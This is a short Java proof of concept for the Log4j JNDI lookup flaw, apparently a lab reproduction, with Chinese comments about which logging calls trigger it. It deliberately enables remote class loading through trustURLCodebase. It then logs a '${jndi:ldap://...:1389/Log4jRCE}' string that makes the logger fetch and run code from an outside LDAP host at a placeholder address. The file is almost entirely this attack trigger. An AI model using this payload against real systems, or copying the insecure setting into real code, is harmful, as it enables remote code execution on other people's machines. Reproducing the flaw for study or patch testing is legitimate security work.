//log4j服务端代码

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("${jndi:ldap://{ip port}:1389/Log4jRCE}"); //这里注意修改！
         //以下是可触发漏洞方法
        //logger.error(log);
        //logger.fatal(log);
    }
}
